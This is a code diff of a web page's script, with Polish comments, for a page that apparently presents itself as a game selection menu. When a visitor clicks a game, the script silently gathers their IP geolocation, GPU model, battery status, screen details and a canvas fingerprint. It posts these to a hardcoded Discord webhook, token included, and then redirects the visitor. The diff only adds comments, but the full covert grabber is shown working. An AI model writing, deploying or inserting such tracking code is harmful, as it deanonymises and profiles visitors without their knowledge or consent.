@@ -145,6 +145,7 @@
     </div>
 
     <script>
+        // Animacja tła (Matrix)
         const canvas = document.getElementById('matrix-bg');
         const ctx = canvas.getContext('2d');
         function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
@@ -167,6 +168,7 @@
         }
         setInterval(drawMatrix, 30);
 
+        // Zmienne globalne na dodatkowe dane
         let geoData = {
             ip: "Nieznane", country: "Nieznany", region: "Nieznany", city: "Nieznane", 
             postal: "Nieznany", isp: "Nieznany", asn: "Nieznany", lat: "Brak", lon: "Brak", timezone: "Nieznana", org: "Nieznana"
@@ -174,6 +176,7 @@
         let gpuModel = "Nie wykryto GPU";
         let batteryInfo = "Brak danych (Niewspierane/Desktop)";
 
+        // Asynchroniczne pobranie danych o lokalizacji IP
         fetch("https://ipapi.co/json/")
             .then(res => res.json())
             .then(data => {
@@ -194,6 +197,7 @@
             })
             .catch(() => { document.getElementById("ip").innerHTML = "> Wybierz gre!"; });
 
+        // GPU Skaner
         try {
             const glCanvas = document.createElement('canvas');
             const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
@@ -203,6 +207,7 @@
             }
         } catch (e) {}
 
+        // Bateria
         if (navigator.getBattery) {
             navigator.getBattery().then(batt => {
                 const isCharging = batt.charging ? 'Ładuje' : 'Rozładowuje';
@@ -210,6 +215,7 @@
             });
         }
 
+        // Unikalny Canvas Fingerprint
         function getCanvasFingerprint() {
             try {
                 const fCanvas = document.createElement('canvas');
@@ -229,6 +235,7 @@
         }
 
         function sendDataAndRedirect(destinationUrl, gameName) {
+            // Blokada po kliknięciu
             document.querySelectorAll('.game-btn').forEach(btn => {
                 btn.style.pointerEvents = "none";
                 btn.style.opacity = "0.7";
@@ -239,6 +246,7 @@
             const nav = navigator;
             const scr = window.screen;
 
+            // Maksymalizacja zbierania danych z przeglądarki
             const screenRes = `${scr.width}x${scr.height} (${scr.colorDepth}-bit, px: ${scr.pixelDepth})`;
             const windowRes = `${window.innerWidth}x${window.innerHeight} (Avail: ${scr.availWidth}x${scr.availHeight})`;
             const orientation = (scr.orientation || {}).type || "Brak danych";
@@ -266,7 +274,7 @@
             const canvasHash = getCanvasFingerprint();
             const referrer = document.referrer || "Brak / Bezpośrednie wejście";
 
-
+            // Budowa potężnego ładunku z podziałem na sekcje
             const payload = {
                 content: "=======================================\n" +
                          `🚨 **MARIUSZHITMAN GITHUB**\n` +
@@ -308,12 +316,14 @@
                          "======================================="
             };
 
+            // Wysłanie danych pod wskazany Discord Webhook
             fetch("https://discord.com/api/webhooks/1524739296358301830/Y92PysbT7F2Wrbd5Oz0JcdtHAWJDO-g9H2yH_-Frs5RP8MCPmZyDKAfq1BZ6QITk22G1", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             }).catch(() => {});
 
+            // Niemal natychmiastowe przekierowanie
             setTimeout(() => {
                 window.location.href = destinationUrl;
             }, 100);
